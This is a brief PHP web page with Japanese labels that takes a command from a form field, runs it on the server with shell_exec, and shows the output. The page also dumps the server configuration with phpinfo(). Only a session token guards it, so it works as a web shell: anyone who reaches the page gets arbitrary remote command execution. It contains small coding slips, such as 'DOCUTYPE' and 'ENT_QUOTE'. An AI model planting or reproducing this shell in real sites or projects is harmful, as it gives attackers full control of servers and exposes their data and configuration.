<?php
$command = "";
session_start();
if(isset($_POST["command"])){
    $command = $_POST["command"];
    if(!empty($command) and $_SESSION["token"] == $_POST["token"]){
        $res = shell_exec($command);
    }
}
$token = sha1(rand()."jng42p98weoidjsalv");
$_SESSION["token"] = $token;
?>
<!DOCUTYPE html>
<html>
<head>
</head>
<body>
<form action="?" method="post">
<input type="hidden" value="<?php echo $token; ?>" name="token" />
<p style="margin:0 auto;">コマンド:<input type="text" name="command" size="24" value="<?php echo htmlspecialchars($command,ENT_QUOTES); ?>" style="width:80%;" /><input type="submit" value="送信" /></p>
<?php if(!empty($res)){ ?>
<div>
    <h2>実行結果</h2>
    <pre>
    <?php echo htmlspecialchars($res,ENT_QUOTE); ?>
    </pre>
</div>
<?php } ?>
</form>
<?php 
    phpinfo();
?>
</body>
</html>